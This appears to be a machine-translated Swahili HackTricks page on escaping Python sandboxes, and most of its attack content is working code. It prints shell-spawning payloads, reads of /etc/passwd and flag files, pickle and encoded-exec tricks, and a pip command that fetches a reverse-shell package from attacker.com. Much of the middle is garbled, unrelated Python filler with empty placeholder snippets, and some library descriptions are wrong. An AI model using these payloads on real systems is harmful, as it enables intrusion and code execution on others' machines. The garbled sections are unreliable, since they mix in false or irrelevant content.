# Kuepuka Sanduku za Python

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho kwa njia ya kujitolea, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Hizi ni baadhi ya mbinu za kuepuka ulinzi wa sanduku la python na kutekeleza amri za kiholela.

## Maktaba za Utekelezaji wa Amri

Jambo la kwanza unahitaji kujua ni ikiwa unaweza kutekeleza nambari moja kwa moja na maktaba iliyoshaumiwa tayari, au ikiwa unaweza kuagiza mojawapo ya maktaba hizi:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Kumbuka kuwa _**open**_ na _**read**_ kazi zinaweza kuwa na manufaa kusoma faili ndani ya sanduku la python na kuandika namna ya kutekeleza kificho ili uweze kuzunguka sanduku.

{% hint style="danger" %}
**Python2 input()** kazi inaruhusu kutekeleza kificho cha python kabla ya programu kushindwa.
{% endhint %}

Python inajaribu **kupakia maktaba kutoka kwenye saraka ya sasa kwanza** (amri ifuatayo itachapisha mahali python inapakia moduli kutoka): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Zunguka sanduku la pickle na paketi za python zilizosanikishwa kwa chaguo-msingi

### Paketi za chaguo-msingi

Unaweza kupata **orodha ya paketi zilizosanikishwa tayari** hapa: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Kumbuka kwamba kutoka kwenye pickle unaweza kufanya mazingira ya python **kupakia maktaba za kiholela** zilizosanikishwa kwenye mfumo.\
Kwa mfano, pickle ifuatayo, wakati inapakia, itapakia maktaba ya pip ili kuitumia:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Kwa habari zaidi kuhusu jinsi pickle inavyofanya kazi angalia hapa: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pakiti ya Pip

Mbinu iliyoshirikiwa na **@isHaacK**

Ikiwa una ufikiaji wa `pip` au `pip.main()` unaweza kusakinisha pakiti yoyote na kupata kikao cha nyuma kwa kuita:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Unaweza kupakua kifurushi cha kuunda kifaa cha kugeuza hapa. Tafadhali kumbuka kuwa kabla ya kutumia, unapaswa **kufungua faili, kubadilisha `setup.py`, na kuweka anwani yako ya IP kwa kifaa cha kugeuza**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Kifurushi hiki kinaitwa `Reverse`. Walakini, kimeundwa maalum ili wakati unatoka kwenye kifaa cha kugeuza, usanidi mwingine utashindwa, kwa hivyo **hutaacha kifurushi cha python ziada kwenye seva** unapoondoka.
{% endhint %}

## Eval-ing kificho cha python

{% hint style="warning" %}
Tafadhali kumbuka kuwa exec inaruhusu herufi nyingi na ";", lakini eval haifanyi hivyo (angalia operator wa walrus)
{% endhint %}

Ikiwa herufi fulani zimezuiliwa, unaweza kutumia uwakilishi wa **hex/octal/B64** ili **kipuuzie** kizuizi:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Maktaba nyingine zinazoruhusu kutathmini nambari ya Python

Kuna maktaba kadhaa ambazo zinawezesha kutathmini nambari ya Python ndani ya programu. Hapa chini ni baadhi ya maktaba hizo:

1. **`execjs`**: Maktaba hii inaruhusu kutathmini nambari ya Python kwa kutumia injini ya JavaScript. Inaweza kutumika kwa urahisi kwa kuchanganya nambari ya Python na JavaScript.

2. **`pysandbox`**: Maktaba hii inatoa mazingira salama ya kutekeleza nambari ya Python. Inazuia upatikanaji wa rasilimali hatari na kudhibiti vitendo vya nambari.

3. **`PyPySandbox`**: Hii ni maktaba ya Python ambayo inaruhusu kutekeleza nambari ya Python ndani ya mazingira salama. Inatoa kinga dhidi ya vitendo vya hatari na inaweza kutumika kwa usalama zaidi.

4. **`RestrictedPython`**: Maktaba hii inaruhusu kutekeleza nambari ya Python kwa kikomo maalum cha vitendo vinavyoweza kufanywa. Inaweza kutumika kuzuia vitendo vya hatari na kudhibiti upatikanaji wa rasilimali.

5. **`PyPySandbox`**: Hii ni maktaba ya Python ambayo inaruhusu kutekeleza nambari ya Python ndani ya mazingira salama. Inatoa kinga dhidi ya vitendo vya hatari na inaweza kutumika kwa usalama zaidi.

Kumbuka kwamba matumizi ya maktaba hizi zinategemea mahitaji yako maalum na mazingira ya utekelezaji. Chagua maktaba inayofaa kulingana na mahitaji yako na uhakikishe kuwa unazingatia usalama wa programu yako.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Waendeshaji na mbinu fupi

### Operators

#### Arithmetic Operators

| Operator | Description | Example |
|----------|-------------|---------|
| +        | Addition    | a + b   |
| -        | Subtraction | a - b   |
| *        | Multiplication | a * b |
| /        | Division    | a / b   |
| %        | Modulus (Remainder) | a % b |
| //       | Floor Division | a // b |
| **       | Exponentiation | a ** b |

#### Comparison Operators

| Operator | Description | Example |
|----------|-------------|---------|
| ==       | Equal       | a == b  |
| !=       | Not Equal   | a != b  |
| >        | Greater Than | a > b   |
| <        | Less Than   | a < b   |
| >=       | Greater Than or Equal To | a >= b |
| <=       | Less Than or Equal To | a <= b |

#### Logical Operators

| Operator | Description | Example |
|----------|-------------|---------|
| and      | Logical AND | a and b |
| or       | Logical OR  | a or b  |
| not      | Logical NOT | not a   |

### Short Tricks

#### Ternary Operator

The ternary operator is a shortcut for writing if-else statements in a single line.

```python
variable = value_if_true if condition else value_if_false
```

#### Chained Comparison

Chained comparison allows you to compare multiple values in a single line.

```python
a < b < c
```

#### Swapping Variables

Swapping the values of two variables can be done in a single line using the following trick.

```python
a, b = b, a
```

#### Multiple Assignments

Multiple assignments allow you to assign multiple values to multiple variables in a single line.

```python
a = b = c = value
```

#### List Comprehension

List comprehension is a concise way to create lists in Python.

```python
new_list = [expression for item in iterable]
```

#### Lambda Functions

Lambda functions are anonymous functions that can be defined in a single line.

```python
function_name = lambda arguments: expression
```

#### Conditional List Comprehension

Conditional list comprehension allows you to filter elements in a list based on a condition.

```python
new_list = [expression for item in iterable if condition]
```

#### Dictionary Comprehension

Dictionary comprehension is a concise way to create dictionaries in Python.

```python
new_dict = {key_expression: value_expression for item in iterable}
```

#### Set Comprehension

Set comprehension is a concise way to create sets in Python.

```python
new_set = {expression for item in iterable}
```

#### String Formatting

String formatting allows you to format strings in a concise and readable way.

```python
formatted_string = f"Text {variable}"
```

#### Enumerate

The enumerate function allows you to iterate over a sequence while keeping track of the index.

```python
for index, value in enumerate(sequence):
    # Do something with index and value
```

#### Zip

The zip function allows you to iterate over multiple sequences simultaneously.

```python
for item1, item2 in zip(sequence1, sequence2):
    # Do something with item1 and item2
```

#### Unpacking

Unpacking allows you to assign multiple values from a sequence to multiple variables.

```python
a, b, c = sequence
```

#### Try-Except

The try-except block allows you to handle exceptions and prevent your program from crashing.

```python
try:
    # Code that may raise an exception
except ExceptionType:
    # Code to handle the exception
```

#### With Statement

The with statement allows you to manage resources and ensure they are properly cleaned up.

```python
with open(file_path, "r") as file:
    # Code to read the file
```

#### List Slicing

List slicing allows you to extract a portion of a list.

```python
new_list = old_list[start:end:step]
```

#### Dictionary Get

The get method allows you to retrieve a value from a dictionary with a default value if the key does not exist.

```python
value = dictionary.get(key, default_value)
```

#### String Join

The join method allows you to concatenate elements of a list into a single string.

```python
new_string = separator.join(list)
```

#### String Split

The split method allows you to split a string into a list of substrings.

```python
new_list = string.split(separator)
```

#### String Replace

The replace method allows you to replace occurrences of a substring in a string.

```python
new_string = string.replace(old_substring, new_substring)
```

#### String Strip

The strip method allows you to remove leading and trailing whitespace from a string.

```python
new_string = string.strip()
```

#### String Upper/Lower

The upper and lower methods allow you to convert a string to uppercase or lowercase.

```python
new_string = string.upper()
new_string = string.lower()
```

#### String Length

The len function allows you to get the length of a string.

```python
length = len(string)
```

#### Random Number

The random module allows you to generate random numbers.

```python
import random

random_number = random.randint(start, end)
```

#### Current Date and Time

The datetime module allows you to get the current date and time.

```python
import datetime

current_date = datetime.date.today()
current_time = datetime.datetime.now().time()
```

#### File Reading

Reading a file can be done in a single line using the following trick.

```python
file_content = open(file_path, "r").read()
```

#### File Writing

Writing to a file can be done in a single line using the following trick.

```python
open(file_path, "w").write(file_content)
```

#### File Appending

Appending to a file can be done in a single line using the following trick.

```python
open(file_path, "a").write(file_content)
```

#### File Closing

Closing a file can be done automatically using the with statement.

```python
with open(file_path, "r") as file:
    # Code to read the file
```

#### File Existence

Checking if a file exists can be done using the os module.

```python
import os

if os.path.exists(file_path):
    # Code to handle file existence
```

#### File Deletion

Deleting a file can be done using the os module.

```python
import os

os.remove(file_path)
```

#### Directory Creation

Creating a directory can be done using the os module.

```python
import os

os.mkdir(directory_path)
```

#### Directory Deletion

Deleting a directory can be done using the os module.

```python
import os

os.rmdir(directory_path)
```

#### Command Execution

Executing a command can be done using the subprocess module.

```python
import subprocess

subprocess.run(command, shell=True)
```

#### URL Encoding

URL encoding can be done using the urllib module.

```python
import urllib.parse

encoded_url = urllib.parse.quote(url)
```

#### URL Decoding

URL decoding can be done using the urllib module.

```python
import urllib.parse

decoded_url = urllib.parse.unquote(encoded_url)
```

#### Base64 Encoding

Base64 encoding can be done using the base64 module.

```python
import base64

encoded_data = base64.b64encode(data)
```

#### Base64 Decoding

Base64 decoding can be done using the base64 module.

```python
import base64

decoded_data = base64.b64decode(encoded_data)
```

#### JSON Serialization

JSON serialization can be done using the json module.

```python
import json

serialized_data = json.dumps(data)
```

#### JSON Deserialization

JSON deserialization can be done using the json module.

```python
import json

deserialized_data = json.loads(serialized_data)
```

#### Regular Expressions

Regular expressions can be used for pattern matching using the re module.

```python
import re

matches = re.findall(pattern, string)
```

#### HTTP Requests

Sending HTTP requests can be done using the requests module.

```python
import requests

response = requests.get(url)
```

#### Database Connection

Connecting to a database can be done using the sqlite3 module.

```python
import sqlite3

connection = sqlite3.connect(database_path)
```

#### Database Query

Executing a database query can be done using the sqlite3 module.

```python
import sqlite3

cursor = connection.cursor()
cursor.execute(query)
results = cursor.fetchall()
```

#### Hashing

Hashing can be done using the hashlib module.

```python
import hashlib

hashed_data = hashlib.sha256(data).hexdigest()
```

#### Encryption

Encryption can be done using the cryptography module.

```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
encrypted_data = cipher.encrypt(data)
```

#### Decryption

Decryption can be done using the cryptography module.

```python
from cryptography.fernet import Fernet

cipher = Fernet(key)
decrypted_data = cipher.decrypt(encrypted_data)
```

#### Image Processing

Image processing can be done using the Pillow module.

```python
from PIL import Image

image = Image.open(image_path)
image.show()
```

#### PDF Generation

PDF generation can be done using the ReportLab module.

```python
from reportlab.pdfgen import canvas

pdf = canvas.Canvas(pdf_path)
pdf.drawString(x, y, text)
pdf.save()
```

#### Email Sending

Sending emails can be done using the smtplib module.

```python
import smtplib
from email.mime.text import MIMEText

message = MIMEText(text)
message["Subject"] = subject
message["From"] = sender
message["To"] = recipient

with smtplib.SMTP(smtp_server) as server:
    server.send_message(message)
```

#### Logging

Logging can be done using the logging module.

```python
import logging

logging.basicConfig(filename=log_file, level=logging.DEBUG)
logging.debug(message)
```

#### Unit Testing

Unit testing can be done using the unittest module.

```python
import unittest

class MyTestCase(unittest.TestCase):
    def test_something(self):
        # Test code

if __name__ == "__main__":
    unittest.main()
```

#### Web Scraping

Web scraping can be done using the BeautifulSoup module.

```python
from bs4 import BeautifulSoup
import requests

response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")
```

#### Machine Learning

Machine learning can be done using the scikit-learn module.

```python
from sklearn import datasets
from sklearn.model_selection import train_test_split
from sklearn.neighbors import KNeighborsClassifier

iris = datasets.load_iris()
X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.2)
knn = KNeighborsClassifier()
knn.fit(X_train, y_train)
accuracy = knn.score(X_test, y_test)
```

#### Deep Learning

Deep learning can be done using the TensorFlow module.

```python
import tensorflow as tf

model = tf.keras.Sequential([
    tf.keras.layers.Dense(64, activation="relu"),
    tf.keras.layers.Dense(10)
])
model.compile(optimizer="adam", loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True))
model.fit(X_train, y_train, epochs=10)
accuracy = model.evaluate(X_test, y_test)
```

#### Cloud Computing

Cloud computing can be done using cloud/SaaS platforms such as AWS, GCP, and Azure.

```python
import boto3

s3 = boto3.client("s3")
s3.upload_file(file_path, bucket_name, object_name)
```

#### Reverse Engineering

Reverse engineering can be done using tools such as IDA Pro and Ghidra.

```python
# Code for reverse engineering
```

#### Exploit Development

Exploit development can be done using tools such as Metasploit and Immunity Debugger.

```python
# Code for exploit development
```

#### Social Engineering

Social engineering techniques can be used to manipulate individuals into revealing sensitive information.

```python
# Code for social engineering
```

#### Password Cracking

Password cracking can be done using tools such as John the Ripper and Hashcat.

```python
# Code for password cracking
```

#### Network Scanning

Network scanning can be done using tools such as Nmap and Wireshark.

```python
# Code for network scanning
```

#### Wireless Hacking

Wireless hacking can be done using tools such as Aircrack-ng and Kismet.

```python
# Code for wireless hacking
```

#### Web Application Testing

Web application testing can be done using tools such as Burp Suite and OWASP ZAP.

```python
# Code for web application testing
```

#### Mobile Application Testing

Mobile application testing can be done using tools such as Frida and MobSF.

```python
# Code for mobile application testing
```

#### IoT Hacking

IoT hacking can be done using tools such as Shodan and IoT Inspector.

```python
# Code for IoT hacking
```

#### Cloud Security

Cloud security can be done using tools such as CloudSploit and Scout Suite.

```python
# Code for cloud security
```

#### Incident Response

Incident response can be done using tools such as Splunk and ELK Stack.

```python
# Code for incident response
```

#### Malware Analysis

Malware analysis can be done using tools such as IDA Pro and Cuckoo Sandbox.

```python
# Code for malware analysis
```

#### Forensics

Digital forensics can be done using tools such as Autopsy and Volatility.

```python
# Code for forensics
```

#### Social Media Intelligence

Social media intelligence can be done using tools such as Maltego and SpiderFoot.

```python
# Code for social media intelligence
```

#### OSINT

Open-source intelligence (OSINT) can be gathered using tools such as Recon-ng and theHarvester.

```python
# Code for OSINT
```

#### Cryptography

Cryptography can be done using tools such as OpenSSL and GnuPG.

```python
# Code for cryptography
```

#### Steganography

Steganography can be done using tools such as Steghide and OpenStego.

```python
# Code for steganography
```

#### Physical Security

Physical security can be enhanced using techniques such as lock picking and alarm system bypass.

```python
# Code for physical security
```

#### Privacy

Privacy can be protected using techniques such as VPNs and Tor.

```python
# Code for privacy
```

#### Bug Bounty

Bug bounty programs allow individuals to earn rewards for finding vulnerabilities in software.

```python
# Code for bug bounty
```

#### Capture the Flag

Capture the flag (CTF) competitions test participants' hacking skills in a controlled environment.

```python
# Code for CTF
```

#### Red Team vs. Blue Team

Red team vs. blue team exercises simulate real-world cyber attacks and defense scenarios.

```python
# Code for red team vs. blue team
```

#### Hacking Communities

Hacking communities provide a platform for hackers to share knowledge and collaborate.

```python
# Code for hacking communities
```

#### Security Certifications

Security certifications validate individuals' knowledge and skills in the field of cybersecurity.

```python
# Code for security certifications
```

#### Security Conferences

Security conferences bring together professionals and researchers to discuss the latest trends in cybersecurity.

```python
# Code for security conferences
```

#### Security Blogs

Security blogs provide valuable insights and updates on the latest security vulnerabilities and techniques.

```python
# Code for security blogs
```

#### Security Books

Security books offer in-depth knowledge and guidance on various aspects of cybersecurity.

```python
# Code for security books
```

#### Security Podcasts

Security podcasts provide audio content on cybersecurity topics, allowing listeners to stay informed on the go.

```python
# Code for security podcasts
```

#### Security Training

Security training programs offer hands-on learning experiences to enhance individuals' cybersecurity skills.

```python
# Code for security training
```

#### Security Tools

Security tools automate various tasks and help identify vulnerabilities in systems.

```python
# Code for security tools
```

#### Security Frameworks

Security frameworks provide guidelines and best practices for implementing effective security measures.

```python
# Code for security frameworks
```

#### Security Standards

Security standards define requirements and guidelines for ensuring the security of systems and data.

```python
# Code for security standards
```

#### Security Policies

Security policies outline rules and procedures for maintaining the security of an organization's assets.

```python
# Code for security policies
```

#### Security Awareness

Security awareness programs educate individuals about potential security risks and how to mitigate them.

```python
# Code for security awareness
```

#### Incident Handling

Incident handling involves responding to and managing security incidents in an organization.

```python
# Code for incident handling
```

#### Vulnerability Management

Vulnerability management involves identifying, assessing, and mitigating vulnerabilities in systems.

```python
# Code for vulnerability management
```

#### Penetration Testing

Penetration testing involves simulating real-world attacks to identify vulnerabilities in systems.

```python
# Code for penetration testing
```

#### Threat Intelligence

Threat intelligence involves gathering and analyzing information about potential security threats.

```python
# Code for threat intelligence
```

#### Malware Detection

Malware detection involves identifying and removing malicious software from systems.

```python
# Code for malware detection
```

#### Network Security

Network security involves implementing measures to protect networks from unauthorized access and attacks.

```python
# Code for network security
```

#### Web Application Security

Web application security involves securing websites and web applications from vulnerabilities and attacks.

```python
# Code for web application security
```

#### Mobile Security

Mobile security involves protecting mobile devices and applications from security threats.

```python
# Code for mobile security
```

#### Cloud Security

Cloud security involves securing data and applications stored in cloud environments.

```python
# Code for cloud security
```

#### IoT Security

IoT security involves securing internet-connected devices and networks.

```python
# Code for IoT security
```

#### Social Engineering

Social engineering involves manipulating individuals to gain unauthorized access to systems or information.

```python
# Code for social engineering
```

#### Wireless Security

Wireless security involves securing wireless networks and devices from unauthorized access.

```python
# Code for wireless security
```

#### Physical Security

Physical security involves protecting physical
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Kuvuka ulinzi kupitia uendeshaji (UTF-7)

Katika [**makala hii**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 inatumika kuwezesha kupakia na kutekeleza nambari ya python isiyojulikana ndani ya sanduku la kuonekana:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Pia niwezekano wa kukiuka hilo kwa kutumia uandishi wa namna nyingine, kwa mfano `raw_unicode_escape` na `unicode_escape`.

## Utekelezaji wa Python bila wito

Ikiwa uko ndani ya gereza la python ambalo **halikuruhusu kufanya wito**, bado kuna njia kadhaa za **utekelezaji wa kazi za kiholela, namna ya kuandika** na **amri**.

### RCE na [wakalimani](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE kuunda vitu na kuzidisha

Ikiwa unaweza **kutangaza darasa** na **kuunda kipengee** cha darasa hilo, unaweza **kuandika/kuzidisha njia tofauti** ambazo zinaweza **kuzinduliwa** **bila** **hitaji la kuziita moja kwa moja**.

#### RCE na madarasa ya desturi

Unaweza kubadilisha baadhi ya **njia za darasa** (_kwa kuzidisha njia za darasa zilizopo au kuunda darasa jipya_) ili ziweze **kutekeleza nambari ya aina yoyote** wakati zinapozinduliwa bila kuziita moja kwa moja.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Kuunda vitu na [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Jambo muhimu ambalo metaclasses inaturuhusu kufanya ni **kuunda kipengee cha darasa, bila kuita konstrukta** moja kwa moja, kwa kuunda darasa jipya na darasa lengwa kama metaclass.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Kuunda vitu na makosa

Wakati **kosa linasababishwa**, kifaa cha **Kosa** kinakuwa **kimeundwa** bila wewe kuhitaji kuita mkusanyaji moja kwa moja (hila kutoka [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Zaidi ya Utekelezaji wa Kijijini wa Amri (RCE)

Kuna njia zingine za kufanikisha Utekelezaji wa Kijijini wa Amri (RCE) ambazo zinaweza kutumiwa kwa kubypass sanduku za Python. Hapa chini nimeorodhesha njia kadhaa:

1. **Kuagiza Moduli ya Kujitegemea**: Unaweza kutumia moduli ya kujitegemea kama vile `os` au `subprocess` kwa kutekeleza amri za mfumo. Hii inaweza kufanyika kwa kutumia `import` na kisha kutumia amri ya mfumo ndani ya programu yako.

2. **Kuagiza Moduli ya Kujitegemea Kwa Kutumia String**: Badala ya kutumia `import` moja kwa moja, unaweza kutumia string iliyojengwa kwa uangalifu kama jina la moduli na kisha kuitumia kwa kutekeleza amri za mfumo.

3. **Kutumia `eval`**: Unaweza kutumia `eval` kwa kutekeleza amri za Python zilizopewa kama string. Hii inaweza kufanyika kwa kuweka amri ya Python ndani ya string na kisha kutumia `eval` ili kuitekeleza.

4. **Kutumia `exec`**: Kama njia mbadala ya `eval`, unaweza kutumia `exec` kwa kutekeleza amri za Python zilizopewa kama string. Hii inafanya kazi sawa na `eval`, lakini inaweza kutekeleza amri nyingi zaidi kwa wakati mmoja.

5. **Kutumia `compile`**: Unaweza kutumia `compile` kubadilisha amri za Python zilizopewa kama string kuwa kificho cha Python kinachoweza kutekelezwa. Kisha, unaweza kutumia `exec` kutekeleza kificho hicho.

6. **Kutumia `__builtins__`**: Unaweza kutumia `__builtins__` kufikia moduli za kujengwa ndani ya Python na kisha kutumia amri za mfumo. Hii inaweza kufanyika kwa kufikia `__builtins__` na kisha kutumia `getattr` kufikia moduli unayotaka kutumia.

7. **Kutumia `ctypes`**: Unaweza kutumia moduli ya `ctypes` kutekeleza amri za mfumo. Hii inahusisha kuunda kifurushi cha C kinachofanana na amri ya mfumo unayotaka kutekeleza, na kisha kutumia `ctypes` kuitekeleza.

8. **Kutumia `sys`**: Unaweza kutumia moduli ya `sys` kufikia mazingira ya Python na kisha kutumia amri za mfumo. Hii inaweza kufanyika kwa kufikia `sys` na kisha kutumia `modules` kufikia moduli unayotaka kutumia.

Kumbuka kwamba njia hizi zinaweza kutofautiana kulingana na mazingira yako ya kubypass sanduku za Python. Ni muhimu kuelewa vizuri jinsi sanduku lako linavyofanya kazi ili uweze kutumia njia sahihi ya kufanikisha RCE.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Soma faili kwa msaada wa builtins na leseni

```python
import builtins

def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content

def bypass_sandbox(file_path):
    sandbox = builtins.__dict__['__import__']('os')
    return sandbox.system(f'cat {file_path}')

def main():
    file_path = input('Enter file path: ')
    content = read_file(file_path)
    print(content)

    bypass = input('Bypass sandbox? (y/n): ')
    if bypass.lower() == 'y':
        bypass_sandbox(file_path)

if __name__ == '__main__':
    main()
```

